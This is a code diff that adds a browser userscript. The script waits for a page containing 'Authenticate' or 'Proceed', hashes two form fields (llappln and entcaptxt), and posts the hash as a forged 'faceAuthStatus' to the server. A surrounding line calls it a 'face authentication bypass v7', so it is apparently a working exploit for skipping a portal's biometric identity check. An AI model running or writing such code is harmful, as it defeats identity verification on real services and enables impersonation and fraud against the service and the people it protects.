@@ -1,3 +1,82 @@
+(function () {
+    'use strict';
+
+    let alreadyExecuted = false;
+
+    // 1️⃣ SHA-256 Function
+    async function hashSHA256(str) {
+        const encoder = new TextEncoder();
+        const data = encoder.encode(str);
+        const hashBuffer = await crypto.subtle.digest("SHA-256", data);
+        const hashArray = Array.from(new Uint8Array(hashBuffer));
+        return hashArray.map(b => b.toString(16).padStart(2, "0")).join("");
+    }
+
+    // 2️⃣ Main execution function
+    async function runScript() {
+        if (alreadyExecuted) return;
+        if (!document.body) return;
+
+        const pageText = document.body.innerText;
+
+        if (!pageText.includes("Authenticate") && !pageText.includes("Proceed")) {
+            return; // keep checking
+        }
+
+        alreadyExecuted = true; // prevent multiple runs
+        clearInterval(checkInterval);
+
+        console.log("✅ Required text detected. Running script...");
+
+        const llapplnField = document.querySelector('[name="llappln"]');
+        const entcaptxtField = document.querySelector('[name="entcaptxt"]');
+
+        if (!llapplnField || !entcaptxtField) {
+            console.error("❌ Required input fields not found.");
+            return;
+        }
+
+        const llappln = llapplnField.value.trim();
+        const entcaptxt = entcaptxtField.value.trim();
+
+        if (!llappln || !entcaptxt) {
+            console.error("❌ llappln or entcaptxt is empty.");
+            return;
+        }
+
+        const faceAuthString = llappln + entcaptxt;
+        console.log("🔹 Combined String:", faceAuthString);
+
+        try {
+            const faceAuthStatus = await hashSHA256(faceAuthString);
+            console.log("🔐 Generated Hash:", faceAuthStatus);
+
+            const response = await fetch("faceAuthStatus.do", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/x-www-form-urlencoded"
+                },
+                body: "faceAuthStatus=" + encodeURIComponent(faceAuthStatus)
+            });
+
+            const result = await response.text();
+            console.log("✅ Server Response:", result);
+
+        } catch (error) {
+            console.error("❌ Error:", error);
+        }
+    }
+
+    // 3️⃣ Check every 500ms
+    const checkInterval = setInterval(runScript, 500);
+
+})();
+
+
+
+
+
+
 (function() {
     console.log("🔓 Enhanced face authentication bypass v7 activated");
     
